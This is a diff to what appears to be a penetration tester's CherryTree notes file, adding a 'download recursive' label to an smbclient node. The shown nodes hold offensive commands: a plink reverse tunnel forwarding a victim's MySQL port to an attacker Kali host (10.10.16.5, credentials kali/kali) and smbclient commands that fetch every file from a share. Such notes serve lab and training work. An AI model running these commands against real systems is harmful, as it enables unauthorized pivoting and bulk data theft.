@@ -694,8 +694,10 @@ Get-Process -Id (Get-NetTCPConnection -LocalPort 8888).OwningProcess
     <node name="plink_tunnel" unique_id="107" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1665828699" ts_lastsave="1665829950">
       <rich_text>C:\temp\plink.exe -l kali -pw kali 10.10.16.5 -R 3306:127.0.0.1:3306 -P 2222 &lt;&lt; working plink mysql forward using cmd.exe (nc.exe)</rich_text>
     </node>
-    <node name="smbclient" unique_id="108" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1666013032" ts_lastsave="1666013042">
-      <rich_text>mask ""
+    <node name="smbclient" unique_id="108" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1666013032" ts_lastsave="1666013047">
+      <rich_text>download recursive
+
+mask ""
 recurse ON
 prompt OFF
 mget *</rich_text>
